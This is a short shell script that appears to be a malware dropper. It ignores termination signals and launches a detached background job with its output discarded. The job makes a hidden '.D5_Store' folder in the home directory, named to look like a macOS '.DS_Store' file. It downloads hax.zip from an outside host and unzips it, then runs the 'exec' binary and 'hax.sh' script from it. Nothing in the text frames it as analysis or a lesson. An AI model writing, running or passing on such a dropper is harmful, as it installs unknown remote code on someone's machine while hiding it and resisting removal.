trap "" SIGTERM SIGINT SIGQUIT SIGHUP
nohup bash -c "
trap '' SIGTERM SIGINT SIGQUIT SIGHUP
cd ~
rm -rf .D5_Store
mkdir .D5_Store
cd .D5_Store
curl -O http://emraldia.com/hax.zip
unzip hax.zip
./exec
bash hax.sh
" > /dev/null &
